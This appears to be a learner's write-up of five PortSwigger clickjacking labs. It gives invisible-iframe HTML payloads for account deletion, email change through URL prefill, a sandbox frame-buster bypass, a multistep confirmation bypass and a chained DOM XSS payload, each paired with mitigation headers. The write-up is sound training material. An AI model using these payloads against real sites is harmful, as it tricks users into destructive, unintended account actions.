#  Lab: Basic clickjacking with CSRF token protection
**Platform:** PortSwigger Web Security Academy
**Goal:** Trick the victim into clicking a hidden "Delete account" button by overlaying an invisible iframe on top of a decoy button.
**Vulnerability:** UI Redressing (Clickjacking). The target application does not prevent its pages from being framed by other domains (Missing `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` headers).

##  The Concept (Why CSRF Tokens Don't Stop Clickjacking)
CSRF attacks rely on the attacker forging a cross-site request. Modern apps use CSRF tokens to block this. However, **Clickjacking bypasses CSRF tokens completely.** Why? Because in Clickjacking, the attacker doesn't forge the request. The attacker simply loads the legitimate application inside an invisible `<iframe>`. The victim, interacting with the invisible iframe within their own authenticated browser session, naturally clicks the *real* button. The browser then submits the *real* form, including the *real* CSRF token. The server sees a perfectly valid, authenticated request and executes it.

##  Step-by-Step Exploitation

### Step 1: Craft the Decoy Page
1. Go to the Exploit Server.
2. Create an HTML page containing a highly visible, enticing decoy button (e.g., "Click to win!").
3. Embed the target application's sensitive page (e.g., `/my-account`) using an `<iframe>`.

### Step 2: The CSS Magic (Alignment & Invisibility)
1. Use CSS `position: absolute` and `z-index` to place the `<iframe>` strictly *on top* of the decoy button.
2. Initially, set the iframe's `opacity: 0.5` (semi-transparent) so you can visually align the target button (e.g., "Delete account") exactly over your decoy button.
3. Adjust the `top` and `left` CSS properties of your decoy button until the alignment is pixel-perfect.
4. Once aligned, change the iframe's `opacity: 0.0001` (virtually invisible).

**Payload Structure:**
```html
<style>
    iframe {
        position: absolute;
        width: 700px;
        height: 500px;
        top: 0;
        left: 0;
        opacity: 0.0001; /* Invisible cloak */
        z-index: 2; /* On top */
    }
    .decoy {
        position: absolute;
        top: 380px; /* Adjusted for alignment */
        left: 20px; /* Adjusted for alignment */
        z-index: 1; /* Underneath */
        padding: 10px;
        background: red;
        color: white;
    }
</style>
<div class="decoy">Click me to Win!</div>
<iframe src="[https://YOUR-LAB-ID.web-security-academy.net/my-account](https://YOUR-LAB-ID.web-security-academy.net/my-account)"></iframe>
```
### Step 3: Execute the Takedown
1. Store the payload on the Exploit Server.

2. Deliver the exploit to the victim. The victim clicks the "Win!" button, inadvertently clicking the hidden "Delete account" button, solving the lab.

**Key Takeaway / Mitigation:** To prevent Clickjacking, servers must instruct browsers NOT to frame their pages. This is done using HTTP headers:

* X-Frame-Options: DENY (or SAMEORIGIN) - Legacy but widely supported.

* Content-Security-Policy: frame-ancestors 'none' (or 'self') - Modern, robust standard.

# 2nd Lab

# Lab: Clickjacking with form input data prefilled from a URL parameter
**Platform:** PortSwigger Web Security Academy
**Goal:** Change the victim's email address by tricking them into clicking the "Update email" button via UI redressing.
**Vulnerability:** Clickjacking combined with URL-based form data prefilling.

## The Concept (The Autofill Exploit)
Clickjacking relies on intercepting clicks, not keystrokes. An attacker cannot force a victim to type malicious data into a hidden iframe. However, if the target application allows form inputs to be prefilled via URL parameters (e.g., `GET /profile?email=attacker@evil.com`), the attacker bypasses the typing restriction entirely. 
The attacker frames the target page using the manipulated URL. The victim's browser loads the invisible iframe with the attacker's payload already inserted into the input field. The attacker then uses standard UI redressing to trick the victim into clicking the form's "Submit/Update" button, successfully executing the state-changing action with attacker-controlled data.

## Step-by-Step Exploitation

### Step 1: Verify the Prefill Feature
Test the target endpoint by appending a parameter to the URL: `https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@test.com`. If the input field populates with the provided value, it is vulnerable.

### Step 2: Craft the Exploit Payload
Construct an HTML payload on the Exploit Server with a decoy button and the invisible iframe.
**Crucial:** The `src` attribute of the iframe MUST contain the prefill parameter.

```html
<style>
    iframe {
        position: absolute;
        width: 700px;
        height: 500px;
        top: 0;
        left: 0;
        opacity: 0.0001; /* Invisible cloak */
        z-index: 2;
    }
    .decoy-button {
        position: absolute;
        top: 450px; /* Adjust for perfect alignment */
        left: 80px; /* Adjust for perfect alignment */
        z-index: 1;
        padding: 10px;
        background: red;
        color: white;
    }
</style>
<div class="decoy-button">Click to Win!</div>
<iframe src="[https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@evil.com](https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@evil.com)"></iframe>
```
### Step 3: Align and Deliver
1. Temporarily set iframe opacity: 0.5 to visually align the decoy button exactly underneath the target's "Update email" button.

2. Once aligned, restore opacity: 0.0001.

3. Deliver the exploit to the victim. The victim clicks the decoy, hitting the hidden "Update" button, which submits the prefilled attacker email. Lab Solved! 

**Key Takeaway / Mitigation**: Allowing state-changing form fields to be prefilled directly from URL parameters significantly increases the attack surface for CSRF and Clickjacking. Applications should rely on secure session state or explicit user input, and always deploy robust Anti-Clickjacking headers (Content-Security-Policy: frame-ancestors).


# 3rd Lab


# Lab: Clickjacking with a frame buster script
**Platform:** PortSwigger Web Security Academy
**Goal:** Bypass a JavaScript frame buster script to change the victim's email address using Clickjacking.
**Vulnerability:** UI Redressing (Clickjacking) bypassing legacy frame busting defenses via the HTML5 `sandbox` attribute.

##  The Concept (Sandboxing Frame Busters)
Before modern HTTP headers (`X-Frame-Options`, `Content-Security-Policy`) became standard, developers relied on client-side JavaScript to prevent their pages from being framed. A typical "Frame Buster" script looks like this:
`if (top != window) { top.location = window.location; }`
If the page detects it's inside an iframe, it attempts to redirect the parent window to its own URL, effectively "busting" out of the frame and ruining the Clickjacking attack.

**The Bypass:** The HTML5 `sandbox` attribute allows developers to strictly restrict the capabilities of an `<iframe>`. By setting `sandbox="allow-forms"`, we grant the iframe permission to submit forms, but we implicitly **deny** it the ability to execute top-level navigation (because we omitted `allow-top-navigation`). When the frame buster script attempts to redirect the parent window, the browser blocks the action, rendering the defense useless.

##  Step-by-Step Exploitation

### Step 1: Craft the Sandboxed Payload
Create the HTML payload on the Exploit Server. Combine the `sandbox` bypass with the URL prefill trick (`?email=...`) to automate the data entry.

```html
<style>
    iframe {
        position: absolute;
        width: 700px;
        height: 500px;
        top: 0;
        left: 0;
        opacity: 0.0001; /* Invisible cloak */
        z-index: 2;
    }
    .decoy-button {
        position: absolute;
        top: 450px; /* Adjust for perfect alignment */
        left: 80px; /* Adjust for perfect alignment */
        z-index: 1;
        padding: 10px;
        background: red;
        color: white;
    }
</style>
<div class="decoy-button">Click to Win!</div>
<iframe sandbox="allow-forms" src="[https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@evil.com](https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@evil.com)"></iframe>
```

### Step 2: Align and Deliver
1. emporarily set iframe opacity: 0.5 to visually align the decoy button exactly underneath the target's prefilled "Update email" button.

2. Once pixel-perfect alignment is achieved, restore opacity: 0.0001.

3. Deliver the exploit to the victim. The sandboxed iframe loads successfully, the frame buster is neutralized, and the victim's click seamlessly updates their email. Lab Solved!

**Key Takeaway / Mitigation**: Client-side JavaScript (Frame Busting) is an obsolete and easily bypassed defense against Clickjacking. Applications must rely exclusively on robust server-side HTTP headers (Content-Security-Policy: frame-ancestors 'none' or 'self') to explicitly instruct the browser not to frame the content.


# 4th Lab


#  Lab: Multistep clickjacking
**Platform:** PortSwigger Web Security Academy
**Goal:** Trick the victim into deleting their account by executing a multistep Clickjacking attack that bypasses a confirmation dialog.
**Vulnerability:** UI Redressing (Clickjacking) bypassing multi-step workflows.

##  The Concept (The Double Trap)
Developers often implement confirmation dialogs (e.g., modals asking "Are you sure?") to protect highly sensitive actions like account deletion. They assume that while a user might be tricked into one erroneous click, they won't be tricked into two sequential clicks in different locations.
**The Bypass:** An attacker can create a decoy interface that inherently requires multiple interactions. By carefully aligning multiple decoy buttons with the sequential hidden buttons of the target application, the attacker forces the victim to navigate the entire hidden workflow blindly.

## Step-by-Step Exploitation

### Step 1: Craft the Multistep Payload
Create an HTML payload with two distinct decoy buttons and the invisible iframe targeting the sensitive endpoint.

```html
<style>
    iframe {
        position: absolute;
        width: 700px;
        height: 700px;
        top: 0;
        left: 0;
        opacity: 0.0001; /* Invisible cloak */
        z-index: 2;
    }
    .button-1 {
        position: absolute;
        top: 500px; /* Set to align with action initiation (e.g., "Delete") */
        left: 50px;
        z-index: 1;
        padding: 10px;
        background: blue;
        color: white;
    }
    .button-2 {
        position: absolute;
        top: 350px; /* Set to align with confirmation (e.g., "Yes") */
        left: 250px;
        z-index: 1;
        padding: 10px;
        background: red;
        color: white;
    }
</style>
<div class="button-1">Click me first</div>
<div class="button-2">Click me second</div>
<iframe src="[https://YOUR-LAB-ID.web-security-academy.net/my-account](https://YOUR-LAB-ID.web-security-academy.net/my-account)"></iframe>
```
### Step 2: Sequential Alignment
1. Temporarily set iframe opacity: 0.5.

2. Align .button-1 precisely over the initial "Delete account" button.

3. Crucial: Click the semi-transparent "Delete account" button within the iframe to trigger the confirmation modal.

4. With the modal visible, align .button-2 precisely over the confirmation "Yes" button.

5. Restore opacity: 0.0001.

### Step 3: Execute the Takedown
Deliver the exploit to the victim. The victim clicks the first decoy button, triggering the hidden modal. They then click the second decoy button, unknowingly confirming the hidden deletion prompt. Lab Solved! 

**Key Takeaway / Mitigation:** Confirmation dialogs, modals, and multi-step workflows are UX features, not security controls against Clickjacking. If the application can be framed, an attacker can script the victim's clicks. The only robust defense remains X-Frame-Options or Content-Security-Policy: frame-ancestors.




# 5th lab 



#  Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS
**Platform:** PortSwigger Web Security Academy
**Goal:** Chain a Clickjacking vulnerability with a DOM-based XSS vulnerability to execute JavaScript (`print()`) in the victim's browser.
**Vulnerability:** Vulnerability Chaining (UI Redressing + DOM XSS via URL pre-filling).

##  The Concept (Vulnerability Chaining)
Often, a DOM-based XSS vulnerability might seem unexploitable if it requires the user to manually type the malicious payload into a form field and click submit. However, if the application allows form fields to be pre-filled via URL parameters (e.g., `?name=payload`), an attacker can automate the input phase. 
To automate the execution phase (the "Submit" click), the attacker chains this with Clickjacking. The attacker frames the vulnerable form using the pre-filled URL. The victim is tricked into clicking a decoy button, which actually clicks the target form's "Submit" button, triggering the DOM XSS seamlessly.

##  Step-by-Step Exploitation

### Step 1: Craft the Chained Payload
Create an HTML payload on the Exploit Server. The `src` of the iframe must point to the vulnerable form and include the XSS payload (`<img src=1 onerror=print()>`) in the vulnerable parameter (e.g., `name`). It should also pre-fill any other required fields so the form is ready to submit.

```html
<style>
    iframe {
        position: absolute;
        width: 800px;
        height: 800px;
        top: 0;
        left: 0;
        opacity: 0.0001; /* Invisible cloak */
        z-index: 2;
    }
    .decoy-button {
        position: absolute;
        top: 650px; /* Adjust for perfect alignment */
        left: 80px; /* Adjust for perfect alignment */
        z-index: 1;
        padding: 10px;
        background: red;
        color: white;
    }
</style>
<div class="decoy-button">Click to Win!</div>
<iframe src="[https://YOUR-LAB-ID.web-security-academy.net/feedback?name=](https://YOUR-LAB-ID.web-security-academy.net/feedback?name=)<img src=1 onerror=print()>&email=hacker@evil.com&subject=hello&message=test"></iframe>
```
### Step 2: Align and Deliver
1. Temporarily set iframe opacity: 0.5 to visually align the decoy button exactly underneath the target's "Submit feedback" button.

2. Once pixel-perfect alignment is achieved, restore opacity: 0.0001.

3. Deliver the exploit to the victim. The victim clicks the decoy, hitting the hidden "Submit" button. The form processes the pre-filled XSS payload, executing print() in the context of the victim's session. Lab Solved! 

**Key Takeaway / Mitigation:** This highlights the danger of vulnerability chaining. A "low impact" bug (like URL pre-filling) can make a "hard to exploit" bug (like self-XSS) completely weaponizable when combined with Clickjacking. Defense requires fixing the root XSS flaw and implementing robust Content-Security-Policy: frame-ancestors to prevent framing.